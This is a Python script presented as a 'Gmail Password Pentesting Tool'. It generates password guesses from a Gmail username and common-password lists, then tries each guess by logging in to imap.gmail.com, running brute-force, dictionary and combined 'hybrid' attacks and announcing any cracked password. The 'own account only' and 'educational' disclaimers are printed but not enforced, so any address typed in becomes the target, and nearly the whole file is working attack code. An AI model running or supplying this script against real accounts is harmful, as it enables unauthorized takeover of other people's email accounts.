#!/usr/bin/env python3
"""
Gmail Password Pentesting Tool
Tests Gmail security by attempting common password attacks
"""

import imaplib
import time
import random
import string

class GmailPasswordPentester:
    def __init__(self):
        self.attack_attempts = 0
        self.successful_attacks = []
        self.failed_attacks = []
        
    def generate_common_passwords(self, email_address):
        """Generate common password variations based on email"""
        passwords = []
        
        # Extract username from email
        username = email_address.split('@')[0]
        
        # Common password patterns
        common_patterns = [
            # Simple variations
            username,
            username + '123',
            username + '1234',
            username + '12345',
            username + '123456',
            username + '2024',
            username + '2025',
            username + 'password',
            username + 'Password',
            username + 'PASSWORD',
            
            # With special characters
            username + '!',
            username + '@',
            username + '#',
            username + '$',
            username + '%',
            username + '!123',
            username + '@123',
            
            # Reversed
            username[::-1],
            username[::-1] + '123',
            
            # Capitalized
            username.capitalize(),
            username.upper(),
            username.lower(),
            
            # With numbers
            username + '1',
            username + '12',
            username + '123',
            username + '1234',
            username + '12345',
            username + '123456',
            username + '1234567',
            username + '12345678',
            
            # Common passwords
            'password',
            'Password',
            'PASSWORD',
            'password123',
            'Password123',
            'PASSWORD123',
            'admin',
            'Admin',
            'ADMIN',
            'admin123',
            'Admin123',
            'ADMIN123',
            '123456',
            '123456789',
            'qwerty',
            'qwerty123',
            'abc123',
            'ABC123',
            'letmein',
            'welcome',
            'Welcome',
            'WELCOME',
            'welcome123',
            'Welcome123',
            'WELCOME123',
        ]
        
        return common_patterns
    
    def test_password(self, email_address, password, delay=1):
        """Test a single password against Gmail IMAP"""
        try:
            print(f"🔐 Testing: {password}")
            
            # Connect to Gmail IMAP
            mail = imaplib.IMAP4_SSL('imap.gmail.com', 993)
            mail.login(email_address, password)
            
            # If we get here, password worked!
            print(f"✅ SUCCESS! Password found: {password}")
            mail.close()
            mail.logout()
            return True
            
        except imaplib.IMAP4.error as e:
            if "Authentication failed" in str(e):
                print(f"❌ Failed: {password}")
                return False
            else:
                print(f"⚠️  Error: {e}")
                return False
        except Exception as e:
            print(f"❌ Connection error: {e}")
            return False
        finally:
            time.sleep(delay)  # Rate limiting
    
    def brute_force_attack(self, email_address, max_attempts=50):
        """Perform brute force attack on Gmail"""
        print("🚀 Gmail Password Brute Force Attack")
        print("=" * 50)
        print(f"📧 Target: {email_address}")
        print(f"🎯 Max attempts: {max_attempts}")
        print("⚠️  This is for educational purposes only!")
        print()
        
        # Generate password list
        passwords = self.generate_common_passwords(email_address)
        
        # Add more random passwords
        for i in range(20):
            random_pass = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            passwords.append(random_pass)
        
        # Shuffle for randomness
        random.shuffle(passwords)
        
        # Limit attempts
        passwords = passwords[:max_attempts]
        
        print(f"🔍 Testing {len(passwords)} password variations...")
        print()
        
        # Test each password
        for i, password in enumerate(passwords, 1):
            print(f"🎯 Attempt {i}/{len(passwords)}: ", end="")
            
            if self.test_password(email_address, password):
                self.successful_attacks.append(password)
                print(f"\n🎉 PASSWORD CRACKED: {password}")
                print(f"📊 Total attempts: {i}")
                return password
            
            self.attack_attempts += 1
            
            # Rate limiting
            if i % 10 == 0:
                print(f"\n⏸️  Rate limiting... waiting 5 seconds...")
                time.sleep(5)
        
        print(f"\n❌ No passwords found after {len(passwords)} attempts")
        return None
    
    def dictionary_attack(self, email_address, wordlist_file=None):
        """Perform dictionary attack using common passwords"""
        print("📚 Gmail Dictionary Attack")
        print("=" * 50)
        print(f"📧 Target: {email_address}")
        print("⚠️  Using common password dictionary")
        print()
        
        # Common password dictionary
        common_passwords = [
            'password', '123456', '123456789', 'qwerty', 'abc123',
            'password123', 'admin', 'letmein', 'welcome', 'monkey',
            '1234567890', 'dragon', 'master', 'hello', 'freedom',
            'whatever', 'qazwsx', 'trustno1', 'dragon', 'password1',
            'welcome123', 'admin123', '12345678', '1234567890',
            'qwerty123', 'abc123456', 'password1', 'welcome1',
            'admin1', '1234567', 'qwerty1', 'abc1234', 'password12',
            'welcome12', 'admin12', '123456789', 'qwerty12', 'abc12345'
        ]
        
        print(f"🔍 Testing {len(common_passwords)} dictionary words...")
        print()
        
        for i, password in enumerate(common_passwords, 1):
            print(f"🎯 Dictionary {i}/{len(common_passwords)}: ", end="")
            
            if self.test_password(email_address, password):
                self.successful_attacks.append(password)
                print(f"\n🎉 DICTIONARY ATTACK SUCCESS: {password}")
                return password
            
            self.attack_attempts += 1
            time.sleep(0.5)  # Rate limiting
        
        print(f"\n❌ Dictionary attack failed after {len(common_passwords)} attempts")
        return None
    
    def hybrid_attack(self, email_address):
        """Combine multiple attack methods"""
        print("🔥 Gmail Hybrid Password Attack")
        print("=" * 50)
        print(f"📧 Target: {email_address}")
        print("🎯 Combining brute force + dictionary + social engineering")
        print()
        
        # Method 1: Dictionary attack
        print("📚 Phase 1: Dictionary Attack")
        result = self.dictionary_attack(email_address)
        if result:
            return result
        
        # Method 2: Brute force attack
        print("\n💥 Phase 2: Brute Force Attack")
        result = self.brute_force_attack(email_address, max_attempts=30)
        if result:
            return result
        
        print("\n❌ All attack methods failed")
        return None
    
    def generate_security_report(self):
        """Generate security assessment report"""
        print("\n📊 Gmail Security Assessment Report")
        print("=" * 50)
        print(f"🎯 Total attack attempts: {self.attack_attempts}")
        print(f"✅ Successful attacks: {len(self.successful_attacks)}")
        print(f"❌ Failed attacks: {self.attack_attempts - len(self.successful_attacks)}")
        
        if self.successful_attacks:
            print(f"\n🚨 SECURITY VULNERABILITIES FOUND:")
            for password in self.successful_attacks:
                print(f"   🔓 Weak password: {password}")
        else:
            print(f"\n✅ SECURITY ASSESSMENT: No vulnerabilities found!")
            print("   Your Gmail password appears to be secure against common attacks.")
        
        print(f"\n💡 SECURITY RECOMMENDATIONS:")
        print("   ✅ Use strong, unique passwords")
        print("   ✅ Enable 2FA (Two-Factor Authentication)")
        print("   ✅ Use App Passwords for IMAP access")
        print("   ✅ Enable Login Alerts")
        print("   ✅ Check Login Activity regularly")
        print("   ✅ Use a password manager")

def main():
    """Main pentesting function"""
    print("🔐 Gmail Password Pentesting Tool")
    print("=" * 50)
    print("⚠️  This tool tests Gmail security by attempting password attacks")
    print("⚠️  Use only on your own Gmail account for security testing")
    print("⚠️  This is for educational and security assessment purposes")
    print()
    
    # Get target email
    email_address = input("📧 Enter your Gmail address to test: ")
    
    if not email_address or '@gmail.com' not in email_address:
        print("❌ Valid Gmail address required!")
        return
    
    print(f"\n🎯 Target: {email_address}")
    print("⚠️  Starting password attack simulation...")
    print()
    
    # Create pentester
    pentester = GmailPasswordPentester()
    
    try:
        # Perform hybrid attack
        result = pentester.hybrid_attack(email_address)
        
        # Generate security report
        pentester.generate_security_report()
        
    except KeyboardInterrupt:
        print("\n⏹️  Attack interrupted by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")
    finally:
        print(f"\n🔐 Pentesting complete!")

if __name__ == "__main__":
    main()

